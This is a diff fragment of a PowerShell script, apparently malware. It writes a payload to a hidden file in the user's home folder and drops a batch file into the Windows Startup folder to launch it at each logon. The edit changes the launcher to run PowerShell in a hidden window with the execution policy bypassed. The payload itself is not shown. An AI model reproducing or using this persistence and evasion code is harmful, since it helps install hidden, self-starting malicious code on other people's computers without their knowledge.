@@ -51,7 +51,7 @@ while($true){
 $pstr | set-content "~\pspayload.ps1" -Encoding Ascii
 (get-item "~\pspayload.ps1").Attributes += 'Hidden'
 $cmdstr= @"
-start "" "powershell" -windowstyle hidden "~\pspayload.ps1"
+powershell -windowstyle hidden -exec bypass ~\pspayload.ps1
 "@
 $cmdstr | set-content "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\psrunner.bat" -Encoding Ascii
 do{
